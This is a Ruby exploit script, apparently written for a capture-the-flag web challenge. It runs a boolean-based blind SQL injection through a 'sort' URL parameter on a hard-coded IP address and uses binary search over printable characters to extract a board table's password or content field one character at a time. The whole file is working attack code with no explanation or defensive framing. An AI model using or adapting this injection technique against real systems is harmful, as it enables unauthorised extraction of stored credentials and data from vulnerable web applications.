#!/usr/bin/env ruby
STDOUT.sync = true
require 'open-uri'

def check_char n, char, field = 'password'
  url = "http://114.201.226.101/d0602c9017f5ae953f740ba7e844911d/?sort="
  url += URI.encode("*if((select substr(#{field},#{n},1) from sboard where no=1)=char(#{char.ord}),1,-1)")
  data = open(url).read

  if data['Guest</td><td>2011-08-21</td></tr><tr><td>3</td><td>Vguard for smartphone']
    true
  elsif data['Vman</td><td>2011-08-22</td></tr><tr><td>2</td><td>Welcome !']
    false
  else
    puts "[!] #{url}"
    raise data
  end
end

def guess_char n, srange, field = 'password'
  if srange.size == 1
    return srange
  end

  raise "null range" if srange.size == 0

#  puts "[d] #{srange}"

  midchar = srange[srange.size/2-1]

  url = "http://114.201.226.101/d0602c9017f5ae953f740ba7e844911d/?sort="
  url += URI.encode("*if((select substr(#{field},#{n},1) from sboard where no=1)>char(#{midchar.ord}),1,-1)")
#  puts "[d] #{url}"
  data = open(url).read

  if data['Guest</td><td>2011-08-21</td></tr><tr><td>3</td><td>Vguard for smartphone']
#    print "+"
    guess_char n, srange[srange.size/2..-1], field
  elsif data['Vman</td><td>2011-08-22</td></tr><tr><td>2</td><td>Welcome !']
#    print "-"
    guess_char n, srange[0...srange.size/2], field
  else
    puts "[!] #{url}"
    raise data
  end
end

srange = ''
(32..127).each do |c|
  srange << c.chr
end
puts "[.] #{srange}"

#field = 'password'
field = 'content'

i = 1
while true
  c = guess_char(i, srange, field)
  if check_char(i,c, field)
    print c
  else
    raise "check_char fail!"
  end
  i += 1
end
